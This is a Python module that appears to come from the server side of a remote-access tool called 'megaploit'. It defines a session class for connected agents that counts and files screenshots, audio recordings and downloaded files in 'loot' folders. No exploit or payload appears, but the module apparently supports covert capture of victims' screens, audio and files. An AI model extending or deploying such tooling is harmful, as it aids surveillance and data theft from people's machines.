"""
megaploit.server.session
~~~~~~~~~~~~~~~~~~~~~~~~
A Session represents one authenticated agent connection.
It owns the socket and all per-connection counters/state.
"""

from __future__ import annotations

import os
import socket
import time
from dataclasses import dataclass, field


@dataclass
class Session:
    conn: socket.socket
    ip: str
    port: int
    connected_at: float = field(default_factory=time.time)
    screenshot_count: int = 0
    recording_count: int = 0
    download_count: int = 0
    upload_count: int = 0
    id: int = 0                       # set by Listener

    # ---------------------------------------------------------------
    # Convenience helpers
    # ---------------------------------------------------------------

    @property
    def label(self) -> str:
        return f"{self.ip}:{self.port}"

    @property
    def uptime(self) -> str:
        secs = int(time.time() - self.connected_at)
        h, rem = divmod(secs, 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def close(self) -> None:
        try:
            self.conn.close()
        except OSError:
            pass

    # ---------------------------------------------------------------
    # Unique save paths (never overwrite previous files)
    # ---------------------------------------------------------------

    def screenshot_path(self) -> str:
        self.screenshot_count += 1
        os.makedirs("loot/screenshots", exist_ok=True)
        return os.path.join("loot", "screenshots", f"shot_{self.ip}_{self.screenshot_count}.png")

    def recording_path(self) -> str:
        self.recording_count += 1
        os.makedirs("loot/recordings", exist_ok=True)
        return os.path.join("loot", "recordings", f"rec_{self.ip}_{self.recording_count}.wav")

    def download_path(self, remote_name: str) -> str:
        self.download_count += 1
        base = os.path.basename(remote_name)
        os.makedirs("loot/downloads", exist_ok=True)
        return os.path.join("loot", "downloads", f"{self.download_count}_{base}")
